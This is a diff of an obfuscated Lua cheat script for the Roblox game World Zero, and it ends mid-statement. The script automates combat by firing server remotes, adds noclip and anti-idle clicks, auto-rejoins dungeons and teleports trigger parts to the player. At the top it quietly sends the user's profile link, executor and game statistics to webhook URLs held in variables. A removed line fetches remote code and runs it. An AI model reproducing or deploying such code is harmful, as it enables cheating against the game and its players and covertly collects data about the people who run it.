@@ -4,38 +4,35 @@ end
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
+
 local a;
 local b = game:GetService('Players')
 local c = b.LocalPlayer or b:GetPropertyChangedSignal('LocalPlayer'):Wait() or b.LocalPlayer;
 local d = c.UserId;
 local e = game:GetService('HttpService')
-local f = 'User: [' .. c.DisplayName .. ' (@' .. c.Name .. ')](https://www.roblox.com/users/' .. c.UserId .. '/profile)'
-local g;
-local h;
-local i;
-local j;
-local k, l, m, n, o = '', '', '', '', ''
-function utcDateAndTime()
-    local p = os.date("!*t", os.time())
-    local q, r, s, t, u = p.hour, p.min, p.sec, p.day, p.month;
-    if q < 10 then
-        q = '0' .. q
+getgenv().plrLink = 'User: [' .. c.DisplayName .. ' (@' .. c.Name .. ')](https://www.roblox.com/users/' .. c.UserId ..
+                        '/profile)'
+local function f()
+    local g = os.date("!*t", os.time())
+    local h, i, j, k, l = g.hour, g.min, g.sec, g.day, g.month;
+    if h < 10 then
+        h = '0' .. h
     end
-    if r < 10 then
-        r = '0' .. r
+    if i < 10 then
+        i = '0' .. i
     end
-    if s < 10 then
-        s = '0' .. s
+    if j < 10 then
+        j = '0' .. j
     end
-    if t < 10 then
-        t = '0' .. t
+    if k < 10 then
+        k = '0' .. k
     end
-    if u < 10 then
-        u = '0' .. u
+    if l < 10 then
+        l = '0' .. l
     end
-    return q .. ':' .. r .. ':' .. s .. ' - ' .. t .. '/' .. u .. '/' .. p.year
+    return h .. ':' .. i .. ':' .. j .. ' - ' .. k .. '/' .. l .. '/' .. g.year
 end
-local v = {
+local m = {
     Green = 0x00FF00,
     Red = 0xFF0000,
     Black = 0x000000,
@@ -50,61 +47,60 @@ task.spawn(function()
         task.wait()
     until a;
     pcall(function()
-        local function w(x, y, z)
+        local function n(o, p, q)
             request({
-                Url = z,
+                Url = q,
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json"
                 },
                 Body = e:JSONEncode({
                     ["embeds"] = {{
-                        ["title"] = 'Infinite | World Zero',
-                        ["description"] = x,
+                        ["title"] = 'AnyaTeam | World Zero',
+                        ["description"] = o,
                         ["type"] = 'rich',
-                        ["color"] = tonumber(y),
+                        ["color"] = tonumber(p),
                         ["footer"] = {
-                            ["text"] = utcDateAndTime() .. ' UTC'
+                            ["text"] = f() .. ' UTC'
                         }
                     }}
                 })
             })
         end
-        local function A()
-            local B = game:HttpGet(peepo)
-            local C = e:JSONDecode(B)
-            return C
+        local function r()
+            local s = game:HttpGet(peepo)
+            local t = e:JSONDecode(s)
+            return t
         end
-        local D = A()
-        local E = D[eternal]
-        local F = leviathan[D[blissful:lower()]]
-        local G = f .. '\n' .. eternal:upper() .. ': ``' .. E .. '``\n' .. blissful .. ': ``' .. F .. '``'
+        local u = r()
+        local v = u[eternal]
+        local w = leviathan[u[blissful:lower()]]
+        local x = plrLink .. '\n' .. eternal:upper() .. ': `' .. v .. '\n' .. blissful .. ': ' .. w .. ''
         if identifyexecutor then
-            local H = ({identifyexecutor()})[1]
-            G = G .. '\nExecutor: ``' .. H .. '``'
+            local y = ({identifyexecutor()})[1]
+            x = x .. '\nExecutor: `' .. y .. ''
         end
-        local I = game:GetService("TextChatService"):WaitForChild('TextChannels')
-        local J;
-        for K, L in I:GetChildren() do
-            if #L.Name < 6 and #L:GetChildren() > 0 and L:FindFirstChild(c.Name) then
-                J = L.Name;
-                break
+        local z;
+        local A = game:GetService('TextChatService'):WaitForChild('TextChannels'):WaitForChild('RBXGeneral')
+        for B, C in pairs(game:GetService("TextChatService").TextChannels:GetChildren()) do
+            if #C.Name < 6 and C:FindFirstChild(c.Name) then
+                z = C.Name
             end
         end
-        if J then
-            local M = game:GetService("ReplicatedStorage").Shared.Guilds.GetCache:InvokeServer(J)
-            local N;
-            for K, L in M.Members do
-                if tonumber(K) == d then
-                    N = L.Points;
+        if z then
+            local D = game:GetService("ReplicatedStorage").Shared.NewGuildSystem.GetCache:InvokeServer(z)
+            local E;
+            for B, C in D.Members do
+                if tonumber(B) == d then
+                    E = C.Points;
                     break
                 end
             end
-            if N then
-                G = G .. '\nGuild Points: ``' .. N .. '`` / ``' .. J .. '``'
+            if E then
+                x = x .. '\nGuild Points: `' .. E .. ' / ' .. z .. ''
             end
         end
-        local O = {
+        local F = {
             ['VaneRaid'] = 'VANE_KILLS',
             ['KrakenRaid'] = 'KRAKEN_KILLS',
             ['FallenKingRaid'] = 'FALLENKING_KILLS',
@@ -112,50 +108,56 @@ task.spawn(function()
             ['InfiniteTower'] = 'ITF_1',
             ['NightmareNormal'] = 'N_NP1',
             ['NightmareChallenge'] = 'C_NP1',
-            ['CurrentGuildSeason'] = 'G_POINTS16'
+            ['GuildSeason11'] = 'G_POINTS11'
         }
         pcall(function()
-            function getLbScore(P)
-                local Q = game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("LeaderboardHookup")
-                    :WaitForChild("GetScore"):InvokeServer(P, 1)
-                return Q[1], Q[2]
+            local function G(H)
+                local I = game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("LeaderboardHookup")
+                    :WaitForChild("GetScore"):InvokeServer(H, 1)
+                return I[1], I[2]
             end
-            local R, S = getLbScore(O.NightmareChallenge)
-            local T, U = getLbScore(O.NightmareNormal)
-            local V, W = getLbScore(O.InfiniteTower)
-            local X, Y = getLbScore(O.KorruptedKlausRaid)
-            if R > 0 then
-                G = G .. '\nNM Challenge Completed: ``' .. R .. '`` / ``' .. S .. '``'
+            local J, K = G(F.NightmareChallenge)
+            local L, M = G(F.NightmareNormal)
+            local N, O = G(F.InfiniteTower)
+            local P, Q = G(F.KorruptedKlausRaid)
+            if J > 0 then
+                x = x .. '\nNM Challenge Completed: `' .. J .. ' / ' .. K .. ''
             end
-            if T > 0 then
-                G = G .. '\nNM Normal Completed: ``' .. T .. '`` / ``' .. U .. '``'
+            if L > 0 then
+                x = x .. '\nNM Normal Completed: `' .. L .. ' / ' .. M .. ''
             end
-            if V > 99 then
-                G = G .. '\nInfinite Tower Floor Record: ``' .. V .. '``'
+            if N > 99 then
+                x = x .. '\nInfinite Tower Floor Record: `' .. N .. ''
+            end
+            if P > 0 then
+                x = x .. '\nChristmas Raids Completed: `' .. P .. ' / ' .. P .. ''
             end
         end)
-        w(G, olympus and v.Gold or v.Cyan, olympus and cloudy or boink)
+        n(x, olympus and m.Gold or m.Cyan, olympus and cloudy or boink)
     end)
 end)
-local Z = game:GetService("ReplicatedStorage")
-local _ = Z:WaitForChild('Shared')
-local a0 = game:GetService('TeleportService')
-local a1 = game:GetService("VirtualInputManager")
-local a2 = true;
-local a3;
-local a4 = false;
-local a5, a6, a7, a8, a9, aa, ab;
-local ac = false;
-local ad = isfile and readfile and writefile;
-local ae;
-local af = game:GetService('VirtualUser')
-c.Idled:Connect(function()
-    af:CaptureController()
-    af:ClickButton2(Vector2.new())
+local R = game:GetService("ReplicatedStorage")
+local S = R:WaitForChild('Shared')
+local T = game:GetService('TeleportService')
+local U = true;
+local V;
+local W = false;
+local X, Y, Z, _, a0, a1, a2;
+local a3 = false;
+local a4 = isfile and readfile and writefile;
+local a5;
+pcall(function()
+    W = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(d, 8136250)
 end)
-local ag = c.Name;
-local ah = 2727067538;
-local ai = {
+local a6 = game:GetService('VirtualUser')
+c.Idled:Connect(function()
+    a6:CaptureController()
+    a6:ClickButton2(Vector2.new())
+end)
+local a7 = c.Name;
+local a8 = 2727067538;
+local a9 = false;
+local aa = {
     Kicked = false,
     WasInDungeon = false,
     Dungeon = false,
@@ -170,205 +172,276 @@ local ai = {
     CrossSessionGold = false,
     ForceRestartLastTower = false
 }
-local aj = d .. '_InfiniteWorldZeroData.txt'
-local ak = {21, 23, 27, 29, 34, 43, 39, 38}
+local ab = d .. '_InfiniteWorldZeroData.txt'
+local ac = {21, 23, 27, 29, 34, 43, 39, 38}
 function save()
-    local al;
+    local ad;
     if writefile then
-        al = e:JSONEncode(ai)
-        writefile(aj, al)
+        ad = e:JSONEncode(aa)
+        writefile(ab, ad)
     end
 end
 function load()
-    if readfile and isfile and isfile(aj) then
-        ai = e:JSONDecode(readfile(aj))
+    if readfile and isfile and isfile(ab) then
+        aa = e:JSONDecode(readfile(ab))
     end
 end
-if game.PlaceId == ah then
+if game.PlaceId == a8 then
     load()
-    if ai.Kicked or ai.RejoinLastDungeon and tick() - ai.Timestamp <= ai.RejoinLastDungeonThreshold then
-        ai.Kicked = false;
-        ai.CameFromMenu = true;
+    if aa.Kicked or aa.RejoinLastDungeon and tick() - aa.Timestamp <= aa.RejoinLastDungeonThreshold then
+        aa.Kicked = false;
+        aa.CameFromMenu = true;
         save()
-        local am = require(c:WaitForChild("PlayerScripts"):WaitForChild("LocalScript"):WaitForChild("Guis")
+        local ae = require(c:WaitForChild("PlayerScripts"):WaitForChild("LocalScript"):WaitForChild("Guis")
             :WaitForChild("CharacterPicker"))
-        local an = am:GetSelectedProfile()
-        while not an do
+        local af = ae:GetSelectedProfile()
+        while not af do
             task.wait()
-            an = am:GetSelectedProfile()
+            af = ae:GetSelectedProfile()
         end
-        local ao = an.GUID.Value;
-        local ap = _:WaitForChild('Teleport'):WaitForChild('JoinGame')
-        ap:FireServer(ao)
+        local ag = af.GUID.Value;
+        local ah = S:WaitForChild('Teleport'):WaitForChild('JoinGame')
+        ah:FireServer(ag)
     end
 end
-local aq;
+local ai;
+local aj = game:GetService("ReplicatedStorage").Shared.Towers
+local ak = "TowerFinished"
+local al;
+local am = {21, 23, 27, 29, 34, 43}
+local an = {1005, 1006, 1007}
+local ao;
+local ap = {5862275930, 4526768266}
+local aq = table.find(ap, game.PlaceId)
 local ar;
 local as;
 local at;
-local au = {21, 23, 27, 29, 34, 43}
-local av = {1005, 1006, 1007}
+local au;
+local av;
 local aw;
-local ax = {5862275930, 4526768266}
-local ay = table.find(ax, game.PlaceId)
+local ax;
+local ay;
 local az;
 local aA;
 local aB;
 local aC;
-local aD;
-local aE;
-local aF;
-local aG;
-local aH;
-local aI;
-local aJ;
-local aK;
-local aL = {'Crystal'}
-local aM = {}
-local aN = c.Character or c.CharacterAdded:Wait() or c.Character;
-local aO = aN:WaitForChild('HumanoidRootPart')
-local aP, aQ;
+local aD = {'Crystal'}
+local aE = {}
+if R:FindFirstChild("ActiveMission") then
+    local skills = {
+        {"Demon", "BloodBinding"},
+        {"Dragoon", "DragonSlam"},
+        {"Guardian", "AggroDraw"},
+        {"DualWielder", "AttackBuff"},
+        {"Guardian", "UpdateSpeed"},
+        {"Paladin", "LightThurst"},
+        {"Paladin", "GuildedLight"},
+        {"MageOfLight", "Infuse", 6} -- Thêm tham số thứ 3 là thời gian chờ riêng
+    }
+
+    task.spawn(function()
+        local lastInfuseTime = 0 -- Biến để theo dõi thời gian sử dụng Infuse
+        
+        while true do
+            for _, skill in ipairs(skills) do
+                local skillset, action, customCooldown = skill[1], skill[2], skill[3]
+                
+                -- Nếu là kỹ năng Infuse và chưa đến thời gian chờ
+                if action == "Infuse" then
+                    local currentTime = tick()
+                    if currentTime - lastInfuseTime < (customCooldown or 1) then
+                        continue -- Bỏ qua vòng lặp này nếu chưa đủ thời gian chờ
+                    else
+                        lastInfuseTime = currentTime -- Cập nhật thời gian sử dụng
+                    end
+                end
+                
+                local skillFolder = game:GetService("ReplicatedStorage")
+                    :WaitForChild("Shared")
+                    :WaitForChild("Combat")
+                    :WaitForChild("Skillsets")
+                    :FindFirstChild(skillset)
+                    
+                if skillFolder then
+                    local skillAction = skillFolder:FindFirstChild(action)
+                    if skillAction then
+                        skillAction:FireServer()
+                    end
+                end
+            end
+            task.wait(1) -- Vẫn chờ 1 giây trước vòng lặp kế tiếp cho các kỹ năng khác
+        end
+    end)
+end
+if R:FindFirstChild("ActiveMission") then
+    ao = true;
+    ai = game:GetService("Workspace"):WaitForChild("MissionObjects")
+    aj = R:WaitForChild("MissionScripts")
+    ak = R:WaitForChild("ActiveMission").Value;
+    aa.Dungeon = R:WaitForChild("ActiveMission").Value;
+    if table.find(am, ak) then
+        at = true
+    elseif ak == 38 then
+        au = true
+    elseif ak == 46 then
+    -- tuỳ bạn đặt tên biến, miễn code ở dưới chạy vào check
+    aX = true 
+    ax = true
+
+    elseif ak == 39 then
+        av = true
+    else
+        ar = true;
+        al = S.Missions.GetDifficulty:InvokeServer()
+        aa.Difficulty = S.Missions.GetDifficulty:InvokeServer()
+    end
+    if ak == 23 then
+        as = true
+    end
+    if table.find(an, ak) then
+        aw = true
+    end
+    if ak == 45 then
+        ay = true;
+        ax = true
+    end
+    if ak == 44 then
+        aA = true;
+        ax = true
+    end
+    if ak == 22 then
+        aB = true;
+        ax = true
+    end
+    if ak == 17 then
+        az = true;
+        ax = true
+    end
+end
+local aF = c.Character or c.CharacterAdded:Wait() or c.Character;
+local aG = aF:WaitForChild('HumanoidRootPart')
+local aH, aI;
 while true do
     if c.Character and c.Character:FindFirstChild('HealthProperties') then
-        aP = c.Character.HealthProperties;
+        aH = c.Character.HealthProperties;
         break
     end
     task.wait()
 end
-c.CharacterAdded:Connect(function(aR)
-    aN = aR;
-    aO = aN:WaitForChild('HumanoidRootPart')
-    aP = aN:WaitForChild('HealthProperties')
-    aQ = aN:WaitForChild('Equipment')
+c.CharacterAdded:Connect(function(aJ)
+    aF = aJ;
+    aG = aF:WaitForChild('HumanoidRootPart')
+    aH = aF:WaitForChild('HealthProperties')
+    aI = aF:WaitForChild('Equipment')
 end)
-local aS = debug.getupvalue(require(_.Drops).Start, 4)
-local aT = _:WaitForChild('Drops'):WaitForChild('CoinEvent')
-local aU = c:WaitForChild("PlayerGui"):WaitForChild('Profile')
-local aV = aU:WaitForChild('Currency'):WaitForChild('Gold')
-local aW = aV.Value;
-local aX = aW;
-local aY = Z:WaitForChild('PlayerEquips'):WaitForChild(ag)
-local aZ = aY:WaitForChild('Primary')
-local a_ = aY:WaitForChild('Offhand')
-local b0 = aY:WaitForChild('Armor')
-local b1 = _:WaitForChild('ItemUpgrade'):WaitForChild('Upgrade')
-local b2 = aU:WaitForChild("Class")
-local b3 = b2.Value;
-function classCheck(b4)
-    return b3 == b4
+local aK = true;
+local aL = game:GetService("MarketplaceService")
+local aM = debug.getupvalue(require(S.Drops).Start, 4)
+local aN = S:WaitForChild('Drops'):WaitForChild('CoinEvent')
+local aO = c:WaitForChild("PlayerGui"):WaitForChild('Profile')
+local aP = aO:WaitForChild('Currency'):WaitForChild('Gold')
+local aQ = aP.Value;
+local aR = aQ;
+local aS = R:WaitForChild('PlayerEquips'):WaitForChild(a7)
+local aT = aS:WaitForChild('Primary')
+local aU = aS:WaitForChild('Offhand')
+local aV = aS:WaitForChild('Armor')
+local aW = S:WaitForChild('ItemUpgrade'):WaitForChild('Upgrade')
+local aX = game:GetService("Workspace"):WaitForChild("Characters")
+local aY = aO:WaitForChild("Class")
+local aZ = aY.Value;
+local function a_(b0)
+    return aZ == b0
 end
-local b5 = _.Missions.GetMissionPrize;
-aQ = aN.Equipment;
-local b6 = _:WaitForChild('Combat'):WaitForChild('Skillsets')
-local b7 = 0;
-local b8;
-local b9 = 'RaidChestSilver'
-local ba = 'RaidChestGold'
-local bb = false;
-local bc = _:WaitForChild("Combat"):WaitForChild("Attack")
-local bd = game:GetService("Workspace"):FindFirstChild("Mobs")
-local be = _.Mobs.Mobs;
-local bf = workspace.Camera;
-local bg;
-local bh;
-local bi = tick()
-local bj = tick()
-local bk = 0;
-local bl = 0;
-local bm = 0;
-local bn = {}
-local bo = Instance.new('Part')
-bo.Position = Vector3.zero;
-bo.Anchored = true;
-bo.Transparency = 1;
-bo.CanCollide = false;
-bo.Name = 'InfiniteCameraPart'
-bo.Parent = workspace;
-task.spawn(function()
-    if Z:WaitForChild("ActiveMission", 60) then
-        aw = true;
-        aq = game:GetService("Workspace"):WaitForChild("MissionObjects")
-        ar = Z:WaitForChild("MissionScripts")
-        as = Z:WaitForChild("ActiveMission").Value;
-        ai.Dungeon = Z:WaitForChild("ActiveMission").Value;
-        if table.find(au, as) then
-            aB = true
-        elseif as == 38 then
-            aC = true
-        elseif as == 39 then
-            aD = true
-        else
-            az = true;
-            at = _.Missions.GetDifficulty:InvokeServer()
-            ai.Difficulty = _.Missions.GetDifficulty:InvokeServer()
-        end
-        if as == 23 then
-            aA = true
-        end
-        if table.find(av, as) then
-            aE = true
-        end
-        if as == 45 then
-            aG = true;
-            aF = true
-        end
-        if as == 44 then
-            aI = true;
-            aF = true
-        end
-        if as == 22 then
-            aJ = true;
-            aF = true
-        end
-        if as == 17 then
-            aH = true;
-            aF = true
+local b1 = S.Missions.GetMissionPrize;
+aI = aF.Equipment;
+local b2 = S:WaitForChild('Combat'):WaitForChild('Skillsets')
+local b3 = 0;
+local b4;
+local b5 = 'RaidChestSilver'
+local b6 = 'RaidChestGold'
+local b7 = false;
+local b8 = S:WaitForChild("Combat"):WaitForChild("Attack")
+local b9 = game:GetService("Workspace"):FindFirstChild("Mobs")
+local ba = S.Mobs.Mobs;
+local bb = workspace.Camera;
+local bc;
+local bd;
+local be = tick()
+local bf = tick()
+local bg = {'Piledriver', 'Slap'}
+local bh = 0;
+local bi = 0;
+local bj = 0;
+local bk;
+local bl = {}
+local bm = 1;
+do
+    function resetCamera()
+        local bn = aG and (aG:FindFirstChild("Part") or aG)
+        if bn and not (bb.CameraSubject == bn) then
+            bb.CameraSubject = bn
         end
     end
-end)
-do
     function noclip()
-        if aO and aO.CanCollide then
-            aO.CanCollide = false
+        if aG and aG.CanCollide then
+            aG.CanCollide = false
         end
     end
     function unnoclip()
-        if aO and not aO.CanCollide then
-            aO.CanCollide = true
+        if aG and not aG.CanCollide then
+            aG.CanCollide = true
         end
     end
-    function setCamera(bp, bq)
-        local br = bp or aO and (aO:FindFirstChild("Part") or aO)
-        if bp then
-            bp.Position = bq
-        end
-        if br and bf.CameraSubject ~= br then
-            bf.CameraSubject = br
+    function setMobCamera(bo, bp, bq)
+        if not bq or not bo then
+            local bn = bo and bp or aG and (aG:FindFirstChild("Part") or aG)
+            if bn and bb.CameraSubject ~= bn then
+                bb.CameraSubject = bn
+            end
+        else
+            local br = workspace:FindFirstChild('InfiniteCameraPart')
+            if br and br.Position ~= bq then
+                br.CFrame = CFrame.new(bq)
+            end
+            if not br then
+                br = Instance.new('Part')
+                br.Anchored = true;
+                br.CanCollide = false;
+                br.Transparency = 1;
+                br.Size = Vector3.new(1, 1, 1)
+                br.Position = bq;
+                br.Name = 'InfiniteCameraPart'
+                br.Parent = workspace
+            end
+            if bb.CameraSubject ~= br then
+                bb.CameraSubject = br
+            end
         end
     end
     function alive()
-        return aN and aO and aP and aP:FindFirstChild('Health') and aP.Health.Value > 0
+        return aF and aG and aH and aH:FindFirstChild('Health') and aH.Health.Value > 0
     end
     function mounted()
-        return aN and aN:FindFirstChild('Properties') and aN.Properties:GetAttribute('Mounted')
+        return aF and aF:FindFirstChild('Properties') and aF.Properties:GetAttribute('Mounted')
     end
     function isAlive(bs)
         return bs and bs.PrimaryPart and bs:FindFirstChild('HealthProperties') and
                    bs.HealthProperties:FindFirstChild('Health') and bs.HealthProperties.Health.Value > 0
     end
-    function Mob(x)
-        if be:FindFirstChild(x) then
-            return require(be[x])
+    function Mob(o)
+        if ba:FindFirstChild(o) then
+            return require(ba[o])
         end
     end
-    function SwitchOffhandPerks(x)
-        _.Settings.OffhandPerksActive:FireServer(x)
+    function SwitchOffhandPerks(o)
+        S.Settings.OffhandPerksActive:FireServer(o)
     end
-    function timeElapsed(L)
-        local bt = math.floor(L / 86400)
-        local bu = math.floor(L % 86400 / 3600)
-        local bv = math.floor(L % 3600 / 60)
-        local bw = math.floor(L % 60)
+    function timeElapsed(C)
+        local bt = math.floor(C / 86400)
+        local bu = math.floor(C % 86400 / 3600)
+        local bv = math.floor(C % 3600 / 60)
+        local bw = math.floor(C % 60)
         if bt > 0 then
             return bt .. 'd ' .. bu .. 'h ' .. bv .. 'm ' .. bw .. 's'
         elseif bu > 0 then
@@ -397,109 +470,199 @@ do
         return bA
     end
     function getServerGuilds()
-        local I = game:GetService("TextChatService"):WaitForChild('TextChannels')
+        local bC = game:GetService("TextChatService"):WaitForChild('TextChannels')
         local bx = {}
-        for K, L in I:GetChildren() do
-            if #L.Name < 6 and #L:GetChildren() > 0 then
-                table.insert(bx, L.Name)
+        for B, C in bC:GetChildren() do
+            if #C.Name < 6 and #C:GetChildren() > 0 then
+                table.insert(bx, C.Name)
             end
         end
         table.sort(bx)
         return bx
     end
     function getPlrGuild()
-        local I = game:GetService("TextChatService"):WaitForChild('TextChannels')
-        local J;
-        for K, L in I:GetChildren() do
-            if #L.Name < 6 and #L:GetChildren() > 0 and L:FindFirstChild(c.Name) then
-                J = L.Name;
+        local bC = game:GetService("TextChatService"):WaitForChild('TextChannels')
+        local z;
+        for B, C in bC:GetChildren() do
+            if #C.Name < 6 and #C:GetChildren() > 0 and C:FindFirstChild(c.Name) then
+                z = C.Name;
                 break
             end
         end
-        return J
+        return z
     end
 end
-local function bC(bD)
-    return loadstring(game:HttpGet(bD))()
+local bD;
+local bE = 8136250;
+local bF = aO:WaitForChild('Inventory'):WaitForChild('Items')
+local bG = aO:WaitForChild('Inventory'):WaitForChild('Cosmetics')
+local bH = require(S.Missions.MissionData)
+local function bI(bJ)
+    return bH[bJ].LevelRequirement
 end
-local bE = aU:WaitForChild('Inventory'):WaitForChild('Items')
-local bF = aU:WaitForChild('Inventory'):WaitForChild('Cosmetics')
-local bG = require(_.Missions.MissionData)
-function missionLevelReq(bH)
-    return bG[bH].LevelRequirement
+local bK = require(S.Gear.GearPerks)
+local bL = require(S.Items)
+local bM = require(S.Combat)
+local bN = S.Inventory.EquipItem;
+local bO = true;
+local bP = {}
+local bQ = require(S:WaitForChild('Settings'))
+local bR = aO:WaitForChild('Settings')
+local bS;
+local bT;
+local bU;
+local bV;
+local bW;
+local bX = game:GetService('RunService').Heartbeat;
+local function bY()
+    return bR:GetAttribute('OffhandPerksActive')
 end
-local bI = require(_.Gear.GearPerks)
-local bJ = require(_.Items)
-local bK = require(_.Combat)
-local bL = _.Inventory.EquipItem;
-local bM = require(_:WaitForChild('Settings'))
-local bN = aU:WaitForChild('Settings')
-local bO;
-local bP;
-local bQ;
-local bR;
-local bS = game:GetService('RunService').Heartbeat;
-function OffhandPerksActive()
-    return bN:GetAttribute('OffhandPerksActive')
+function StartRaid(o, p)
+    S:WaitForChild('Teleport'):WaitForChild('StartRaid'):FireServer(o, p)
 end
-function StartRaid(x, y)
-    _:WaitForChild('Teleport'):WaitForChild('StartRaid'):FireServer(x, y)
-end
-local bT = require(_.Inventory)
-b2:GetPropertyChangedSignal("Value"):Connect(function()
-    b3 = b2.Value
+local bZ = require(S.Inventory)
+aY:GetPropertyChangedSignal("Value"):Connect(function()
+    aZ = aY.Value
 end)
-local bU = 0;
-_.Missions.MissionStart.OnClientEvent:Once(function()
+local b_ = 0;
+local c0 = 0;
+S.Missions.MissionStart.OnClientEvent:Once(function()
+    a9 = true;
+    b_ = tick()
 end)
 load()
-if not aw then
-    if ai.Kicked and ai.WasInDungeon or ai.RejoinLastDungeon and tick() - ai.Timestamp <= ai.RejoinLastDungeonThreshold and
-        ai.CameFromMenu or ai.WasInDungeon and ai.Dungeon and table.find(au, ai.Dungeon) and ai.ForceRestartLastTower then
-        ai.CameFromMenu = false;
+if not ao then
+    if aa.Kicked and aa.WasInDungeon or aa.RejoinLastDungeon and tick() - aa.Timestamp <= aa.RejoinLastDungeonThreshold and
+        aa.CameFromMenu or aa.WasInDungeon and aa.Dungeon and table.find(am, aa.Dungeon) and aa.ForceRestartLastTower then
+        aa.CameFromMenu = false;
         save()
-        if ai.Dungeon then
-            local bV = _:WaitForChild('Teleport'):WaitForChild('StartRaid')
+        if aa.Dungeon then
+            local c1 = S:WaitForChild('Teleport'):WaitForChild('StartRaid')
             while true do
-                if table.find(ak, ai.Dungeon) then
-                    bV:FireServer(ai.Dungeon)
+                if table.find(ac, aa.Dungeon) then
+                    c1:FireServer(aa.Dungeon)
                 else
-                    bV:FireServer(ai.Dungeon, ai.Difficulty)
+                    c1:FireServer(aa.Dungeon, aa.Difficulty)
                 end
                 task.wait(1)
             end
         end
     else
-        ai.Kicked = false;
-        ai.CameFromMenu = false;
-        ai.WasInDungeon = false;
+        aa.Kicked = false;
+        aa.CameFromMenu = false;
+        aa.WasInDungeon = false;
         save()
     end
-elseif aw then
-    bR = getPlrGuild()
-    ai.WasInDungeon = true;
-    ai.Dungeon = as;
-    ai.Difficulty = at;
-    ai.CameFromMenu = false;
-    ai.Timestamp = tick()
+elseif ao then
+    bW = getPlrGuild()
+    aa.WasInDungeon = true;
+    aa.Dungeon = ak;
+    aa.Difficulty = al;
+    aa.CameFromMenu = false;
+    aa.Timestamp = tick()
     save()
 end
-local bW, bX, bY, bZ = '', '', '', ''
-local b_ = {'Checkpoint1', 'Checkpoint2', 'Checkpoint3', 'Checkpoint4', 'Checkpoint5', 'Checkpoint6', 'Checkpoint7',
-            'Checkpoint8', 'Checkpoint9', 'Checkpoint10', 'CutsceneTrigger', 'Main', 'CaveTrigger', 'BossIntroTrigger',
-            'TownTalkPart', 'BridgeTrigger', 'BoulderTrigger', 'BoulderStopTrigger', 'Cage1Marker', 'Cage2Marker',
-            'CannonTrigger', 'CastleTrigger', 'WallsCheckpoint', 'HammerReset1', 'WallsTrigger', 'WallsFinalTrigger',
-            'Room1Trigger', 'Room2Trigger', 'Room3Trigger', 'Room4Trigger', 'Room5Trigger', 'Room6Trigger',
-            'TreasureMarker', 'NextCheckpointTrigger', 'PreBridgeTrigger', 'CheckpointTriggers', 'CaveSpawnTrigger',
-            'CliffsideEndTrigger', 'VineRoomTrigger', 'CheckpointTrigger', 'ObbyTrigger', 'BossTrigger', 'DropTrigger',
-            'CastleGateTrigger', 'SceneTrigger', 'OutsideBossTrigger', 'Area1Trigger', 'Area2Trigger', 'Area3Trigger',
-            'FinishRing', 'StartWaveDefense', 'Trigger1', 'Trigger2', 'Trigger3', 'BossCutsceneTrigger', 'FloorTrigger',
-            'BossCutscene', 'BottomElevatorTrigger', 'MiddleElevatorTrigger', 'TopElevatorTrigger', 'ObbyTrigger5',
-            'WaveStarter', 'BossDoorTrigger', 'MinibossExit', 'ArenaEntry0', 'ArenaEntry1', 'ArenaEntry2'}
-local c0 = {'Assets_FX', 'Assets_Static', 'Characters', 'Coins', 'Camera', 'SpeedBoosts', 'Projectiles', 'World_Bounds',
-            'Pets', 'MobBlockers', 'Terrain'}
-local c1 = {'Scarecrow1', 'Scarecrow2', 'Scarecrow3'}
 local c2 = {
+    [5] = 1,
+    [1] = 5
+}
+local c3 = {
+    'Checkpoint1','WaveStarter', 'Checkpoint2', 'Checkpoint3', 'Checkpoint4', 'Checkpoint5', 'Checkpoint6', 'Checkpoint7',
+    'Checkpoint8', 'Checkpoint9', 'Checkpoint10', 'CutsceneTrigger', 'Main', 'CaveTrigger', 'BossIntroTrigger',
+    'TownTalkPart', 'BridgeTrigger', 'BoulderTrigger', 'BoulderStopTrigger', 'Cage1Marker', 'Cage2Marker',
+    'CannonTrigger', 'CastleTrigger', 'WallsCheckpoint', 'HammerReset1', 'WallsTrigger', 'WallsFinalTrigger',
+    'Room1Trigger', 'Room2Trigger', 'Room3Trigger', 'Room4Trigger', 'Room5Trigger', 'Room6Trigger',
+    'TreasureMarker', 'NextCheckpointTrigger', 'PreBridgeTrigger', 'CheckpointTriggers', 'CaveSpawnTrigger',
+    'CliffsideEndTrigger', 'VineRoomTrigger', 'CheckpointTrigger', 'ObbyTrigger', 'DropTrigger',
+    'CastleGateTrigger', 'SceneTrigger', 'OutsideBossTrigger', 'Area1Trigger', 'Area2Trigger', 'Area3Trigger',
+    'FinishRing', 'StartWaveDefense', 'Trigger1', 'Trigger2', 'Trigger3', 'BossCutsceneTrigger', 'FloorTrigger',
+    'BossCutscene', 'BottomElevatorTrigger', 'MiddleElevatorTrigger', 'TopElevatorTrigger', 'ObbyTrigger5',
+    'MinibossExit', 'ArenaEntry0', 'ArenaEntry1', 'ArenaEntry2'
+}
+
+-- Cờ kiểm tra để không thêm BossDoorTrigger trùng
+local isBossDoorAdded = false
+
+-- Hàm xử lý TouchInterest
+local function ProcessAllTouchInterests()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer or Players:GetPlayers()[1]
+    local character = LocalPlayer.Character
+    if character then
+        local hrp = character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            for _, C in pairs(workspace:GetDescendants()) do
+                if C and C.Name == "TouchInterest" and C.Parent and
+                    (table.find(c3, C.Parent.Name) or (C.Parent.Parent and table.find(c3, C.Parent.Parent.Name))) then
+                    task.spawn(function()
+                        C.Parent.CanCollide = false
+                        C.Parent.Anchored = true
+                        C.Parent.Transparency = 1
+                        C.Parent.CFrame = CFrame.new(hrp.Position)
+                        task.wait(0.1)
+                        if C and C.Parent then
+                            C.Parent.CFrame = CFrame.new(Vector3.new(0, 0, 0))
+                        end
+                    end)
+                end
+            end
+            print("Đã xử lý tất cả TouchInterest trong c3 sau khi thêm BossDoorTrigger")
+        end
+    end
+end
+
+-- Kiểm tra ak trước khi dùng
+if ak ~= nil then
+    if ak == 43 then
+        table.remove(c3, table.find(c3, 'WaveStarter'))
+        if not table.find(c3, "BossDoorTrigger") then
+            table.insert(c3, "BossDoorTrigger")
+            isBossDoorAdded = true
+            ProcessAllTouchInterests()
+        end
+    elseif not table.find({21, 23, 27, 29, 34, 43, 38, 39}, ak) then
+        if not table.find(c3, "BossTrigger") then  
+            table.insert(c3, "BossTrigger")
+            ProcessAllTouchInterests()
+            print("Đã thêm part vào c3")
+        end
+    end
+else
